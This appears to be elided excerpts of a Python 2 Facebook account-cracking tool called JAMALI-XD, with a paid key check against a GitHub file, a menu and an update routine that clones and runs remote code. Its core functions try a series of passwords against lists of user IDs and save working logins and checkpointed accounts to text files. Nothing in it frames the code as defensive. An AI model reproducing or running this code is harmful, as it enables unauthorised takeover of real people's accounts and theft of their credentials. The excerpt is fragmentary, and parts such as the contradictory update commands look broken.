...
logo = """'
\x1b[1;92m'                   _____            __       __            __        __ 
\x1b[1;92m'                  |     \          |  \     /  \          |  \      |  \
\x1b[1;92m'                   \$$$$$  ______  | $$\   /  $$  ______  | $$       \$$
\x1b[1;92m'                     | $$ |      \ | $$$\ /  $$$ |      \ | $$      |  \
\x1b[1;92m'                __   | $$  \$$$$$$\| $$$$\  $$$$  \$$$$$$\| $$      | $$
 \x1b[1;92m'              |  \  | $$ /      $$| $$\$$ $$ $$ /      $$| $$      | $$
\x1b[1;92m'               | $$__| $$|  $$$$$$$| $$ \$$$| $$|  $$$$$$$| $$_____ | $$
...
'\x1b[1;93m'   FB ID        :     JAMALI ON FIRE
...
def main_apv():
    ...
    try:
        ...
        kok.close()
        print ("")
        print ("           Ya Uper Wale Ap Ke KEY Hai")
        ...
        os.system("xdg-open https://wa.me/+1778-652-6247")
        
    r1=requests.get("https://raw.githubusercontent.com/JAMALI-B/JAMALI-XD/main/server.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
...
def main_system():
    ...
    print "\x1b[1;94m[4]   Check Subscription "
    print "\x1b[1;95m[5]   Update Tools"
    print "\x1b[1;96m[6]   For Any Help Massage WhatsApp"
    print 43*'~'
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("\x1b[1;92m        Member In JAMALI Paid Commands ")
        print ("\x1b[1;91m        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/jamali-B/jamali-XD")
        os.system("rm -rf jamali-XD")
        os.system("cp -f jamali-XD/JAMALI-XD \\.")
        os.system("rm -rf  jamali-XD")
        os.system(" cd jamali-XD")
        os.system(" python2 jamali.py")
        time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[JAMALI-OK] "+coc+user + " | " + pass1
                ok=open('JAMALI random-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
...
def mineExt():
    ...
    print g+"[=] Extracting From jamali : "+my_line[:15]
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[JAMALI-OK] "+uid + " | " + pass1
                ok=open('JAMALI-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;91m[JAMALI-CP] "+uid + " | " + pass1
                    cp=open('JAMALI-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[JAMALI-OK] "+uid + " | " + pass2
                        ok=open('JAMALI-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[JAMALI-CP] "+uid + " | " + pass2
                            cp=open('JAMALI-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[JAMALI-OK] "+uid + " | " + pass3
                                ok=open('JAMALI-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[JAMALI-CP] "+uid + " | " + pass3
                                    cp=open('JAMALI-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[JAMALI-OK] "+uid + " | " + pass4
                                        ok=open('JAMALI-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[JAMALI-CP] "+uid + " | " + pass4
                                            cp=open('JAMALI-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[JAMALI-OK] "+uid + " | " + pass5
                                                ok=open('JAMALI-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[JAMALI-CP] "+uid + " | " + pass5
                                                    cp=open('JAMALI-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
...
def grap():
    ...
    try:
        ...
        print ""
        print ""
        print "\033[1;91m     [ File Making ]"
        print ""
        print "\033[1;92m  [ Maximum Limit 10 IDs ]"
        print ""
        c=raw_input("\033[1;96m[*] How Many Links Do You Want To Dump : ")
        if c=='1':
            ext1()
        elif c=='2':
            ext2()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[JAMALI-OK] "+uid + " | " + pass6
                                                        ok=open('JAMALI-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;91m[JAMALI-CP] "+uid + " | " + pass6
                                                            cp=open('JAMALI-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
